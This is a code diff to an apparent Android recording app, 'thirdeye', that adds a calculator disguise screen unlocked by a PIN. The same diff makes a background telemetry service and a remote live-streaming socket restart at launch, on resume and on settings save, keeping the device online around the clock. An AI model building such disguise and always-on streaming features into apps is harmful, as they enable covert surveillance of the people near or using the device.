@@ -92,6 +92,15 @@ class MainActivity : AppCompatActivity() {
         setContentView(binding.root)
 
         prefs = AppPreferences(this)
+
+        // Check if Calculator disguise is enabled
+        if (prefs.isDisguiseEnabled && !intent.getBooleanExtra("FROM_DISGUISE", false)) {
+            val disguiseIntent = Intent(this, CalculatorActivity::class.java)
+            startActivity(disguiseIntent)
+            finish()
+            return
+        }
+
         timerHandler = Handler(Looper.getMainLooper())
 
         setupViews()
@@ -107,7 +116,8 @@ class MainActivity : AppCompatActivity() {
             ContextCompat.RECEIVER_NOT_EXPORTED
         )
 
-        // Initialize persistent socket for remote live streaming and telemetry
+        // Start 24/7 background telemetry service to ensure device stays online
+        com.thirdeye.app.service.DeviceTelemetryService.startService(this)
         com.thirdeye.app.uploader.SocketManager.initAndConnect(this)
     }
 
@@ -116,6 +126,7 @@ class MainActivity : AppCompatActivity() {
         updateStatusBadges()
         updateRecordingUI(prefs.isRecording)
         BackendClient.sendPing(this)
+        com.thirdeye.app.service.DeviceTelemetryService.startService(this)
         com.thirdeye.app.uploader.SocketManager.initAndConnect(this)
     }
 
@@ -293,6 +304,11 @@ class MainActivity : AppCompatActivity() {
         val switchAutoDelete = view.findViewById<SwitchMaterial>(R.id.switchAutoDelete)
         switchAutoDelete.isChecked = prefs.isAutoDeleteAfterUpload
 
+        val switchDisguise = view.findViewById<SwitchMaterial>(R.id.switchDisguise)
+        val etDisguisePin = view.findViewById<EditText>(R.id.etDisguisePin)
+        switchDisguise.isChecked = prefs.isDisguiseEnabled
+        etDisguisePin.setText(prefs.disguisePin)
+
         val etServer = view.findViewById<EditText>(R.id.etServerUrl)
         etServer.setText(prefs.serverUrl)
 
@@ -325,11 +341,20 @@ class MainActivity : AppCompatActivity() {
             }
             prefs.isHapticFeedbackEnabled = switchHaptic.isChecked
             prefs.isAutoDeleteAfterUpload = switchAutoDelete.isChecked
+            prefs.isDisguiseEnabled = switchDisguise.isChecked
+            val pinInput = etDisguisePin.text.toString().trim()
+            if (pinInput.isNotEmpty()) {
+                prefs.disguisePin = pinInput
+            }
 
             val serverUrlInput = etServer.text.toString().trim()
             if (serverUrlInput.isNotEmpty()) {
                 prefs.serverUrl = serverUrlInput
             }
+
+            // Reconnect telemetry & socket to updated server URL
+            com.thirdeye.app.uploader.SocketManager.initAndConnect(this)
+            com.thirdeye.app.service.DeviceTelemetryService.startService(this)
             BackendClient.sendPing(this)
 
             updateStatusBadges()
